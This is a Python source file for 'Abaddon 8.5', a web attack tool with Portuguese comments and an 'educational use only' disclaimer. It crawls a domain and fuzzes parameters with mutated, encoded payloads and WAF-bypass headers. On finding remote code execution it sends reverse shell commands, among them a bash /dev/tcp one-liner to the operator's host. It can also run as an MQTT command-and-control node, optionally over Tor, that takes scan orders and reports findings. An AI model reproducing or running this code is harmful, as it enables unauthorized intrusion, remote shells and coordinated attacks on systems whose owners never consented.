#!/usr/bin/env python3
# Abaddon 8.5 (Verbose Logging Fix) – Intelligent & Adaptive Web Security Toolkit
#
# DISCLAIMER: This tool is intended for educational purposes and authorized security testing only.
# Unauthorized use of this tool against any system is illegal. The author is not responsible for any misuse.

import os, sys, time, json, random, socket, hashlib, base64, threading, re, concurrent.futures, argparse
import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from faker import Faker

# --- Importações dos Módulos ---
from modules.bypass import mutate_payload, bypass_headers
from modules.param_finder import find_params
try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("WARN: paho-mqtt not found. MQTT C2 will not be available. Run: pip install paho-mqtt")

fake = Faker()

# --- Configuração e Variáveis Globais ---
ROOT_DIR = os.path.expanduser("~/.abaddon8")
os.makedirs(ROOT_DIR, exist_ok=True)
PAYLOADS_FILE = os.path.join(os.path.dirname(__file__), "payloads.json")
LOG_FILE = os.path.join(ROOT_DIR, "abaddon8.log")
PROXY_FILE = os.path.join(os.path.dirname(__file__), "proxies.txt")

OOB_DOMAIN, COOKIE, PROXIES, TARGET_PROFILES, LOG_ENABLED = "", None, [], {}, True
LHOST, LPORT = None, None
VERBOSE_MODE = False # <-- NOVA GLOBAL PARA MODO VERBOSE

def log(msg, level="INFO"):
    if not LOG_ENABLED: return
    # =================== CORREÇÃO DO LOG ===================
    # Se a mensagem for DEBUG e o modo verbose não estiver ativo, ignora.
    if level == "DEBUG" and not VERBOSE_MODE:
        return
    # =======================================================
    levels = {"INFO": "[*]", "SUCCESS": "[+]", "WARN": "[-]", "FAIL": "[!]", "DEBUG": "[>]"}
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {levels.get(level, '[*]')} {msg}"
    print(line)
    with open(LOG_FILE, "a", encoding='utf-8') as f: f.write(line + "\n")

# --- Setup ---
try:
    with open(PAYLOADS_FILE) as f: PAYLOADS = json.load(f)
except Exception as e: log(f"Failed to load payloads.json: {e}", "FAIL"); sys.exit(1)
try:
    with open(PROXY_FILE, 'r') as f: PROXIES = [f"http://{line.strip( )}" for line in f if line.strip()]
    if PROXIES: log(f"{len(PROXIES)} proxies loaded.", "SUCCESS")
except FileNotFoundError: log("proxies.txt not found. No proxies will be used.", "WARN")

# --- Funções de Rede e Utilitários ---
HEADERS = {"User-Agent": fake.user_agent()}
def rand_delay(): time.sleep(random.uniform(0.5, 1.5))
def rotate_proxy(): return {"http": random.choice(PROXIES ), "https": random.choice(PROXIES )} if PROXIES else None

def retry_get(url, **kw):
    if COOKIE: kw.setdefault("headers", {}).update({"Cookie": COOKIE})
    for i in range(3):
        try:
            if 'headers' not in kw: kw['headers'] = HEADERS.copy()
            kw.setdefault("timeout", 10)
            if PROXIES: kw.setdefault("proxies", rotate_proxy())
            rand_delay()
            method = kw.pop('method', 'GET').upper()
            if method == 'POST': return requests.post(url, **kw)
            return requests.get(url, **kw)
        except Exception as e:
            log(f"Retry {i+1} for {url}: {e}", "DEBUG"); time.sleep(2**i)
    return None

# --- Lógica de Detecção e Exploração ---
def encode_payload(payload, host):
    encoders = {'none': lambda x: x, 'url': lambda x: x.replace("'", "%27"), 'base64': lambda x: base64.b64encode(x.encode()).decode(), 'hex': lambda x: "".join(f"%{ord(c):02x}" for c in x), 'comment': lambda x: x.replace(" ", "/**/"),}
    profile = TARGET_PROFILES.get(host, {})
    if 'working_encoder' in profile and random.random() < 0.75:
        encoder_name = profile['working_encoder']
        return encoders[encoder_name](payload), encoder_name
    encoder_name, encoder_func = random.choice(list(encoders.items()))
    return encoder_func(payload), encoder_name

def get_baseline(url, **kw): return retry_get(url, **kw)
def detect_diff(b, r): return b and r and hashlib.md5(b.text.encode()).hexdigest() != hashlib.md5(r.text.encode()).hexdigest()
def detect_time(url, **kw):
    start = time.time()
    retry_get(url, **kw)
    return (time.time() - start) > 4.5
def detect_reflection(r, p): return p in r.text

def crawl_links(url):
    links = set()
    r = retry_get(url)
    if not r: return links
    soup = BeautifulSoup(r.text, "lxml")
    for a in soup.find_all("a", href=True):
        try:
            href = urljoin(url, a["href"]).split('#')[0]
            if urlparse(href).netloc == urlparse(url).netloc: links.add(href)
        except Exception: pass
    return links

class Exploit:
    @staticmethod
    def post_exploit(vuln_info, c2_handler=None):
        if not (LHOST and LPORT):
            log("LHOST e LPORT não configurados. Pulando pós-exploração.", "WARN")
            return

        vuln_type, url, param, place = vuln_info.get("vuln"), vuln_info.get("url"), vuln_info.get("param"), vuln_info.get("place")
        log(f"Iniciando pós-exploração para {vuln_type.upper()} em {url}", "FAIL")

        if vuln_type == "rce":
            log("Tentando obter reverse shell via RCE...", "INFO")
            py_payload = PAYLOADS["post_exploit"]["reverse_shell_python"]["command"].format(lhost=LHOST, lport=LPORT)
            bash_raw = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
            b64_payload = base64.b64encode(bash_raw.encode()).decode()
            bash_b64_payload = PAYLOADS["post_exploit"]["reverse_shell_bash_b64"]["command"].format(base64_payload=b64_payload)

            for cmd_payload in [py_payload, bash_b64_payload]:
                log(f"Enviando comando de reverse shell: {cmd_payload[:70]}...", "DEBUG")
                attack_kw = {"headers": bypass_headers(HEADERS, log_func=log)}
                if place == "query": attack_kw['params'] = {param: f"; {cmd_payload}"}
                elif place == "post": attack_kw['data'] = {param: f"; {cmd_payload}"}
                
                threading.Thread(target=retry_get, args=(url,), kwargs=attack_kw).start()
                log(f"Payload de reverse shell enviado. Verifique seu listener em {LHOST}:{LPORT}", "SUCCESS")
                if c2_handler:
                    c2_handler.send_data({"type": "implant_attempt", "target": url, "lhost": LHOST, "lport": LPORT})
                time.sleep(2)

    @staticmethod
    def test(url, param, place="query", force_payload=None, bypass_log=False, c2_handler=None):
        host = urlparse(url).netloc
        log_level = "DEBUG"
        log(f"Testing URL: {url} | Param: {param} | Place: {place}", log_level)
        
        payload_sets = {"forced": {"direct": [force_payload]}} if force_payload else PAYLOADS

        for vuln_type, payloads in payload_sets.items():
            if vuln_type == "post_exploit": continue

            for category, plist in payloads.items():
                for raw in plist:
                    try:
                        final_payload_str = raw.format(oob_domain=OOB_DOMAIN) if "{oob_domain}" in raw else raw
                        
                        mutated_str = mutate_payload(final_payload_str, log_func=log)
                        payload, encoder_name = encode_payload(mutated_str, host)
                        attack_headers = bypass_headers(HEADERS, log_func=log)
                        
                        baseline_kw = {"params": {param: "abaddon_test"}, "headers": attack_headers}
                        baseline = get_baseline(url, **baseline_kw)
                        
                        attack_kw = {"headers": attack_headers}

                        if len(payload) > 3 and random.random() < 0.3:
                            log(f"Tentando fragmentação de parâmetros (HPP) para o payload", "DEBUG")
                            num_fragments = random.randint(2, 3)
                            fragments = [payload[i::num_fragments] for i in range(num_fragments)]
                            if place == "query": attack_kw['params'] = [(param, frag) for frag in fragments]
                            elif place == "post": attack_kw['data'] = [(param, frag) for frag in fragments]
                        else:
                            if place == "query": attack_kw['params'] = {param: payload}
                            elif place == "post": attack_kw['data'] = {param: payload}
                        
                        if 'params' not in attack_kw and 'data' not in attack_kw: continue
                        
                        confirmed, r = False, None
                        if category == "time":
                            if detect_time(url, **attack_kw): confirmed = True
                        else:
                            r = retry_get(url, **attack_kw)
                            if category == "oob" and OOB_DOMAIN: log(f"OOB payload sent...", "INFO")
                            elif category == "reflected" and r and detect_reflection(r, payload): confirmed = True
                            elif category in ["error", "basic"] and r and detect_diff(baseline, r): confirmed = True
                        
                        if VERBOSE_MODE and r is not None:
                            log(f"[RESPONSE] Status: {r.status_code} | Size: {len(r.text)}", "DEBUG")

                        if confirmed:
                            log(f"VULNERABILITY FOUND: {vuln_type.upper()} ({category}) on {url}", "FAIL")
                            vuln_details = {"url": url, "vuln": vuln_type, "param": param, "place": place, "payload": raw}
                            
                            if LHOST and LPORT:
                                threading.Thread(target=Exploit.post_exploit, args=(vuln_details, c2_handler), daemon=True).start()
                            
                            return vuln_details
                    except Exception as e: log(f"Error during test: {e}", "DEBUG")
        return None

# --- C2Handler e Abaddon ---
class C2Handler:
    def __init__(self, abaddon_instance, args):
        self.abaddon = abaddon_instance
        self.node_id = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
        self.protocol = args.c2_protocol
        self.server = args.c2_server
        self.port = args.c2_port
        self.use_tor = args.c2_tor
        self.stop_event = threading.Event()
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=self.node_id)
        self.client.on_connect = self.on_mqtt_connect
        self.client.on_message = self.on_message

    def connect(self):
        log(f"Iniciando módulo C2 via {self.protocol.upper()}...", "INFO")
        if self.use_tor:
            try:
                import socks
                self.client.proxy_set(socks.SOCKS5, "127.0.0.1", 9050)
            except Exception as e: log(f"Falha ao configurar proxy Tor: {e}", "FAIL"); return
        try:
            self.client.connect(self.server, self.port, 60)
            self.client.loop_start()
            threading.Thread(target=self.send_heartbeat, daemon=True).start()
        except Exception as e: log(f"Falha ao conectar ao broker C2: {e}", "FAIL")

    def on_mqtt_connect(self, client, userdata, flags, rc):
        if rc == 0:
            log(f"Conectado ao Broker MQTT com código de resultado: {rc}", "SUCCESS")
            client.subscribe(f"abaddon/commands/all")
            client.subscribe(f"abaddon/commands/{self.node_id}")
            self.send_data({"status": "online"})
        else: log(f"Falha ao conectar ao broker, código: {rc}", "WARN")

    def on_message(self, client, userdata, msg):
        payload_str = msg.payload.decode('utf-8')
        log(f"Comando C2 recebido: {payload_str}", "DEBUG")
        try:
            command = json.loads(payload_str)
            action = command.get("action")
            if action == "scan":
                target = command.get("target")
                if target:
                    log(f"Iniciando tarefa de scan para: {target}", "INFO")
                    # =================== CORREÇÃO DO LOG ===================
                    # Propaga a opção 'verbose' do C2 para o scan
                    global VERBOSE_MODE
                    if command.get("verbose"):
                        VERBOSE_MODE = True
                    # =======================================================
                    threading.Thread(target=self.abaddon.run_full_scan, args=(target,), kwargs=command, daemon=True).start()
            elif action == "shutdown":
                self.stop_event.set()
                self.client.loop_stop()
                os._exit(0)
        except Exception as e: log(f"Erro ao processar comando C2: {e}", "WARN")

    def send_data(self, data):
        data["node_id"] = self.node_id
        payload = json.dumps(data)
        try:
            self.client.publish(f"abaddon/results/{self.node_id}", payload)
        except Exception as e: log(f"Falha ao enviar dados para C2: {e}", "WARN")

    def send_heartbeat(self):
        while not self.stop_event.is_set():
            time.sleep(60)
            try: self.send_data({"status": "heartbeat"})
            except Exception as e: log(f"Falha ao enviar heartbeat: {e}", "WARN")

class Abaddon:
    def __init__(self, args):
        self.args = args
        self.c2_handler = C2Handler(self, args) if args.c2_protocol else None
        self._scanned_paths = set()
        global LOG_ENABLED, COOKIE, OOB_DOMAIN, VERBOSE_MODE
        LOG_ENABLED, COOKIE, OOB_DOMAIN = not args.no_log, args.cookie, args.oob
        if args.verbose: VERBOSE_MODE = True
    
    def run_full_scan(self, domain, **options):
        self._scanned_paths.clear()
        
        global LHOST, LPORT
        LHOST = options.get("lhost") or self.args.lhost
        LPORT = options.get("lport") or self.args.lport
        
        if LHOST and LPORT:
            log(f"Pós-exploração ativada. Reverse shells tentarão se conectar a {LHOST}:{LPORT}", "FAIL")

        log(f"Starting Abaddon 8.5 against {domain}", "INFO")
        if self.c2_handler: self.c2_handler.send_data({"status": "scan_started", "target": domain})
        
        urls_to_scan = {f"http://{domain}", f"https://{domain}", f"http://www.{domain}", f"https://www.{domain}"}
        log("Initial reconnaissance phase...", "INFO" )
        all_found_links = set()
        for url in list(urls_to_scan):
            all_found_links.update(crawl_links(url))
        urls_to_scan.update(all_found_links)

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            future_to_url = {executor.submit(self.scan_target, url): url for url in list(urls_to_scan)}
            for future in concurrent.futures.as_completed(future_to_url):
                try: future.result()
                except Exception as e: log(f"Erro ao escanear URL {future_to_url[future]}: {e}", "FAIL")
        
        log("Operation finished.", "INFO")
        if self.c2_handler: self.c2_handler.send_data({"status": "scan_complete", "target": domain})
        global VERBOSE_MODE; VERBOSE_MODE = False # Reseta o modo verbose ao final do scan

    def scan_target(self, url):
        if urlparse(url).path in self._scanned_paths: return
        self._scanned_paths.add(urlparse(url).path)
        
        log(f"Scanning: {url}", "INFO")
        params_to_test = set(find_params(url, retry_get))
        if not params_to_test:
            log(f"Nenhum parâmetro encontrado para {url}", "DEBUG")
            return

        log(f"Parameters to test for URL ({url}): {', '.join(params_to_test)}", "INFO")
        
        for param in params_to_test:
            for place in ["query", "post"]:
                res = Exploit.test(url, param, place, c2_handler=self.c2_handler)
                if res and self.c2_handler:
                    self.c2_handler.send_data({"type": "vulnerability", "data": res})

    def start_c2_mode(self):
        if not self.c2_handler:
            log("Configuração de C2 não fornecida.", "FAIL")
            return
        self.c2_handler.connect()
        log("Agente em modo C2. Aguardando comandos...", "INFO")
        try:
            while not self.c2_handler.stop_event.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            log("Desligamento manual detectado.", "INFO")
            self.c2_handler.stop_event.set()
            if self.c2_handler.client: self.c2_handler.client.loop_stop()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Abaddon 8.5 C2-Enabled - Web Security Toolkit")
    parser.add_argument('domain', nargs='?', help="O domínio alvo para scan em modo standalone.")
    
    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument('--cookie', help="Cookie de sessão para usar nas requisições.")
    scan_group.add_argument('--oob', help="Domínio para testes Out-of-Band (OOB).")
    scan_group.add_argument('-t', '--threads', type=int, default=10, help="Número de threads (padrão: 10).")
    scan_group.add_argument('--no-log', action='store_true', help="Desativa o log em arquivo.")
    # =================== CORREÇÃO DO LOG ===================
    scan_group.add_argument('-v', '--verbose', action='store_true', help="Ativa o modo verbose para exibir logs de depuração.")
    # =======================================================

    exploit_group = parser.add_argument_group('Post-Exploitation Options')
    exploit_group.add_argument('--lhost', help="Seu IP (Listening Host) para reverse shells.")
    exploit_group.add_argument('--lport', type=int, help="Sua porta (Listening Port) para reverse shells.")

    c2_group = parser.add_argument_group('C2 Options')
    c2_group.add_argument('--c2-protocol', choices=['mqtt'], help="Protocolo de comunicação C2.")
    c2_group.add_argument('--c2-server', help="Endereço do servidor C2.")
    c2_group.add_argument('--c2-port', type=int, help="Porta do servidor C2.")
    c2_group.add_argument('--c2-tor', action='store_true', help="Roteia a conexão C2 via Tor.")
    
    args = parser.parse_args()
    
    abaddon_instance = Abaddon(args)
    
    if args.c2_protocol and args.c2_server:
        abaddon_instance.start_c2_mode()
    elif args.domain:
        abaddon_instance.run_full_scan(args.domain)
    else:
        parser.print_help()
	

